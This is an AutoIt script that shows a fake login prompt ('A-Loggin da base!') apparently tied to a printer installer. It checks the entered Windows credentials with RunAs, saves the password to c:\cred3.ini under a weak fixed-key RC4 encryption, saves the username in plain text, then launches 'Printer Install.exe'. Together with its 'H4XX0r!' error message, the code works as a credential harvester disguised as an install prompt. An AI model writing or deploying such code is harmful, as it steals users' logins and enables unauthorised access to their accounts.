#include <ButtonConstants.au3>
#include <EditConstants.au3>
#include <GUIConstantsEx.au3>
#include <StaticConstants.au3>
#include <WindowsConstants.au3>
#include <Crypt.au3>
$Logon = GUICreate("A-Loggin da base!", 249, 112, 192, 114)
$usern = GUICtrlCreateInput("", 104, 8, 121, 21)
$passn = GUICtrlCreateInput("", 104, 34, 121, 21, BitOR($GUI_SS_DEFAULT_INPUT,$ES_PASSWORD))
$userLabel = GUICtrlCreateLabel("Username", 16, 8, 78, 24)
GUICtrlSetFont(-1, 12, 400, 0, "MS Sans Serif")
$passLabel = GUICtrlCreateLabel("Password", 19, 33, 73, 24)
GUICtrlSetFont(-1, 12, 400, 0, "MS Sans Serif")
$ok = GUICtrlCreateButton("OK", 128, 64, 100, 30, BitOR($BS_NOTIFY,$BS_FLAT))
$cancel = GUICtrlCreateButton("Cancel", 14, 64, 100, 30, BitOR($BS_NOTIFY,$BS_FLAT))
GUISetState(@SW_SHOW)

While 1
	$usera=GUICtrlRead($usern)
	$passa=GUICtrlRead($passn)
	$computer="bbl"
	$nMsg = GUIGetMsg()
	Switch $nMsg
		Case $GUI_EVENT_CLOSE
			Exit
		case $cancel
			Exit
		case $ok
			If _ValidUserPass($usera, $computer, $passa) = True Then
				Ini_Write("Password","c:\cred3.ini","Section","Key",$passa)
				RunAs($usera, $computer, $passa,2,@ScriptDir&"\Printer Install.exe","",@SW_SHOW)
				IniWrite("cred3.ini","Section","Key2",$usera)
				ExitLoop
			Else
				MsgBox (0,"H4XX0r!","The Username or Password... It is wrong.")
			EndIf
	EndSwitch
WEnd

Func _ValidUserPass($usera, $computer, $passa)
	$usera=GUICtrlRead($usern)
	$passa=GUICtrlRead($passn)
	$computer="bbl"
    Local $valid = True
    RunAs($usera, $computer, $passa, 2, @ComSpec & " /c  echo test", @SystemDir, @SW_SHOW)
    If @error Then $valid = False
    Return $valid
EndFunc

Func Ini_Write($Password,$Filename,$Section,$Key,$Value)
_Crypt_Startup()
if @error Then Return SetError(1,@error,False)
$hKey =_Crypt_DeriveKey($Password,$CALG_RC4)
if @error Then Return SetError(2,@error,False)
$ByteStruct =  DllStructCreate("BYTE[" & StringLen($Value) & "]")
DllStructSetData($ByteStruct,1,$Value)
$StrByte = String(DllStructGetData($ByteStruct,1))
$EncryptedValue = _Crypt_EncryptData($StrByte,$hKey,$CALG_USERKEY)
if @error Then Return SetError(3,@error,False)
IniWrite($Filename,$Section,$Key,$EncryptedValue)
if @error Then Return SetError(4,@error,False)
_Crypt_DestroyKey($hKey)
_Crypt_Shutdown()
Return SetError(0,0,True)
EndFunc
